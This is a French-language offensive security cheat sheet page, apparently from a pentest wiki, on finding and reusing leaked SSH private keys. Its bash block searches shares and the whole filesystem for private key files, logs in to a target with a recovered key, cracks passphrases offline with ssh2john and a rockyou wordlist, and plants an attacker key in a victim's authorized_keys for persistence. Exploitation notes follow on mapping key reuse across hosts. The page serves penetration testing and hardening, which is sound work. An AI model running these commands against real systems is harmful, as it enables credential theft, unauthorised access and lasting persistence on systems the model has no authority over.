---
title: "Exposition de clé publique : recherche et réutilisation de clés privées SSH"
description: "L'authentification à clé publique SSH n'est jamais plus sûre que la clé privée, et les clés privées fuient en permanence : commitées dans des dépôts, laissées dans des partages et sauvegardes lisibles, intégrées dans des images, et stockées sans phrase de passe. Une clé privée récupérée authentifie en tant que son propriétaire sans mot de passe, et la réutilisation de clés sur plusieurs hôtes fait qu'une seule clé fuitée ouvre souvent de nombreux systèmes."
keywords:
  - clé privée ssh
  - authorized_keys
  - réutilisation de clé
  - phrase de passe
  - id_rsa
---

# Exposition de clé publique

L'authentification à clé publique est la façon dont l'essentiel des accès SSH réels sont accordés, et sa sécurité repose entièrement sur le secret de la clé privée, qui est régulièrement perdu. Les clés privées se retrouvent commitées dans des dépôts Git, laissées lisibles par tous dans des partages de fichiers et des sauvegardes, intégrées dans des images de conteneur et des modèles de VM, et stockées sans phrase de passe pour l'automatisation. Une clé privée récupérée authentifie immédiatement en tant que son propriétaire, sans mot de passe, et parce que les opérateurs réutilisent la même clé sur de nombreux hôtes, une seule trouvaille déverrouille fréquemment un parc entier. L'inverse, écrire une clé publique d'attaquant dans le `authorized_keys` d'une cible, est un accès durable et une persistance.

```bash
# hunt for private keys wherever files are readable
grep -rlE 'BEGIN (OPENSSH|RSA|EC|DSA) PRIVATE KEY' /mnt/share /loot 2>/dev/null
find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' -o -name '*.ppk' 2>/dev/null
# use a recovered key
chmod 600 id_rsa; ssh -i id_rsa user@<target>
# passphrase-protected? crack offline
ssh2john id_rsa > h && john --wordlist=rockyou.txt h
# convert PuTTY .ppk to OpenSSH if needed
puttygen key.ppk -O private-openssh -o id_rsa
# plant a key for access/persistence where you can write authorized_keys
echo 'ssh-ed25519 AAAA... a' >> ~victim/.ssh/authorized_keys
```

## Notes d'exploitation

- Cherchez largement : dépôts et leur historique (`.git`), partages de fichiers, sauvegardes, couches d'images, secrets de CI, et répertoires personnels ; une clé sans phrase de passe est un accès instantané, une clé avec phrase de passe est cassable hors ligne avec `ssh2john`.
- La réutilisation de clé est le multiplicateur : cartographiez où apparaît la moitié publique (`authorized_keys` sur plusieurs hôtes, clés de déploiement) pour trouver chaque système qu'une clé récupérée ouvre.
- Le nom d'utilisateur correspondant compte : une clé authentifie en tant que le compte qui la liste dans `authorized_keys` ; essayez le propriétaire évident et les comptes courants (`root`, noms de service).
- Écrire `authorized_keys` fait aussi office de persistance ; combinez avec n'importe quelle primitive d'écriture de fichier sur le répertoire personnel de la cible (écriture par usurpation d'UID NFS, partage accessible en écriture, pied-à-terre existant).

## Outils

- [john the ripper (ssh2john)](https://github.com/openwall/john)
- [trufflehog (key discovery in repos/images)](https://github.com/trufflesecurity/trufflehog)

## Références

- [OpenSSH authorized_keys](https://man.openbsd.org/sshd.8#AUTHORIZED_KEYS_FILE_FORMAT)
- [HackTricks: SSH keys](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh)
